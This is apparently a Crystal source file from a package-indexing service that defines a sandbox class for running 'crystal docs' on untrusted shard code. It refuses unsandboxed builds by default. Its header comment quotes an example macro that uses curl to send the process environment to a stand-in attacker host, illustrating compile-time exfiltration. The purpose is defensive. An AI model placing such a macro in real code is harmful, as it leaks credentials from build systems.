module CrystalShards
  # Runs `crystal docs` on untrusted source.
  #
  # Building documentation for a third-party shard means compiling code we did
  # not write, and Crystal expands macros during that compile. A shard whose
  # source contains a top-level macro statement such as
  #
  #     {% `curl -s -d "$(printenv)" https://attacker.example` %}
  #
  # executes that command inside whatever process runs `crystal docs`. Nobody
  # has to install or run the shard; indexing it is enough. So the compile step
  # is treated as hostile code execution and is confined, while the steps that
  # need credentials or the network (cloning, dependency fetching, uploading)
  # stay outside and never run untrusted code.
  #
  # A sandbox implementation must guarantee, at minimum:
  #
  #   * no environment inherited from the caller, so credentials cannot be read
  #   * no network, so nothing can be exfiltrated or fetched
  #   * an unprivileged user, no capabilities, no privilege escalation
  #   * a writable area that is not the host filesystem
  #   * cpu, memory, pid and wall-clock ceilings
  abstract class DocsSandbox
    class Unavailable < Exception; end

    # Generates documentation from `source_dir` into `output_dir`.
    # Returns false when the build failed; raises `Unavailable` when the
    # sandbox itself could not be started.
    abstract def build_docs(source_dir : String, output_dir : String) : Bool

    # Human-readable description used in logs, so it is always obvious from
    # the log which confinement a build actually ran under.
    abstract def description : String

    # Test seam. When set, `build` returns this proc's result.
    class_property builder : Proc(DocsSandbox)? = nil

    # Must track the toolchain this platform builds with. A shard whose code
    # uses anything newer than the sandbox's compiler fails to document for a
    # reason that has nothing to do with the shard.
    DEFAULT_IMAGE   = "crystallang/crystal:1.21.0-alpine"
    DEFAULT_TIMEOUT = 900
    DEFAULT_MEMORY  = "2Gi"
    DEFAULT_CPUS    = "2"
    DEFAULT_PIDS    = 256

    def self.build : DocsSandbox
      if custom = @@builder
        return custom.call
      end

      case ENV.fetch("DOCS_SANDBOX", "").downcase
      when "docker"
        DockerDocsSandbox.new
      when "kubernetes", "k8s"
        KubernetesDocsSandbox.new
      when "none", ""
        unsandboxed
      else
        raise Unavailable.new(
          "Unknown DOCS_SANDBOX #{ENV["DOCS_SANDBOX"]?.inspect}. " \
          "Expected docker, kubernetes or none."
        )
      end
    end

    # Refusing is the safe default. Building documentation without a sandbox
    # hands shard authors command execution in a process that holds storage
    # and database credentials, so it has to be asked for explicitly and can
    # only ever be a local development choice.
    private def self.unsandboxed : DocsSandbox
      unless ENV["DOCS_SANDBOX_ALLOW_UNSAFE"]? == "true"
        raise Unavailable.new(
          "Refusing to build documentation without a sandbox. Building runs " \
          "untrusted shard code with compile-time command execution. Set " \
          "DOCS_SANDBOX=docker (or kubernetes), or set " \
          "DOCS_SANDBOX_ALLOW_UNSAFE=true for local development only."
        )
      end

      UnsandboxedDocsSandbox.new
    end

    def self.image : String
      ENV.fetch("DOCS_SANDBOX_IMAGE", DEFAULT_IMAGE)
    end

    def self.timeout_seconds : Int32
      ENV["DOCS_SANDBOX_TIMEOUT_SECONDS"]?.try(&.to_i?) || DEFAULT_TIMEOUT
    end

    def self.memory : String
      ENV.fetch("DOCS_SANDBOX_MEMORY", DEFAULT_MEMORY)
    end

    def self.cpus : String
      ENV.fetch("DOCS_SANDBOX_CPUS", DEFAULT_CPUS)
    end

    def self.pids : Int32
      ENV["DOCS_SANDBOX_PIDS"]?.try(&.to_i?) || DEFAULT_PIDS
    end

    protected def log_info(message : String)
      Log.info { "#{self.class.name}: #{message}" }
    end

    protected def log_error(message : String)
      Log.error { "#{self.class.name}: #{message}" }
    end
  end
end

require "./docs_sandbox/*"
